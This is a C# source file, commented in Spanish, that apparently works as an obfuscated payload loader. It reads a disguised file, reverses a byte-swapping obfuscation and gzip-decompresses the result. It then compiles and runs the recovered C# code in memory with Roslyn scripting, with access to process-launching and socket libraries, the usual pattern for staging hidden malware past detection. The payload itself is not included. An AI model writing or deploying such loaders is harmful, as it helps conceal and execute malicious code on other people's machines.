using System.Linq;
using System;
using System.Text;
using System.Reflection;
using System.Threading.Tasks;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp.Scripting;
using Microsoft.CodeAnalysis.Scripting;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.IO.Compression;
using System.Dynamic;
using System.Collections.Generic;
using System.Runtime.Loader; // Agregar este using

class Program {
    static async Task Main() {

        byte[] obfCode = File.ReadAllBytes(".\\b3c_lzma.xz");

        byte[] obfCode2 = TransformBytes(obfCode);

        byte[] obfCode3 = DecompressLZMA(obfCode2);

        string scriptCode = Encoding.UTF8.GetString(obfCode3);

       string code = "";

       
        try
        {

            var optionsStage1 = ScriptOptions.Default
                .AddReferences(
                    typeof(object).Assembly, // mscorlib
                    typeof(Console).Assembly, // System.Console
                    typeof(File).Assembly, // System.IO
                    typeof(Process).Assembly, // System.Diagnostics
                    typeof(Encoding).Assembly, // System.Text
                    typeof(GZipStream).Assembly, // System.IO.Compression
                    typeof(ScriptOptions).Assembly, // Microsoft.CodeAnalysis.Scripting
                    typeof(CSharpScript).Assembly, // Microsoft.CodeAnalysis.CSharp.Scripting
                    typeof(MetadataReference).Assembly, // Microsoft.CodeAnalysis
                    typeof(Socket).Assembly // System.Net.Sockets
                )
                .WithImports(
                    "System",
                    "System.IO",
                    "System.Text",
                    "System.Diagnostics",
                    "System.IO.Compression",
                    "System.Collections.Generic",
                    "Microsoft.CodeAnalysis",
                    "Microsoft.CodeAnalysis.Scripting",
                    "Microsoft.CodeAnalysis.CSharp.Scripting",
                    "System.Net.Sockets"
                );
            // Ejecutar el script y capturar el resultado
            code = await CSharpScript.EvaluateAsync<string>(scriptCode, optionsStage1);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error en el script: {ex.Message}");
        }

    }




        // 🔹 Función para comprimir con LZMA
    static byte[] DecompressLZMA(byte[] compressedData) {
        using (var input = new MemoryStream(compressedData))
        using (var output = new MemoryStream()) {
            using (var gzip = new GZipStream(input, CompressionMode.Decompress))
                gzip.CopyTo(output);
            return output.ToArray();
        }
    }

static byte[] TransformBytes(byte[] input)
{
    byte[] output = new byte[input.Length];

    for (int i = 0; i < input.Length; i++)
    {
        output[i] = input[i] switch
        {
            (byte)'\t' => (byte)' ',  // Tab → Espacio
            (byte)' '  => (byte)'\t', // Espacio → Tab
            (byte)'-'  => (byte)'_',  // - → _
            (byte)'_'  => (byte)'-',  // _ → -
            _ => input[i]
        };
    }

    return output;
}



}

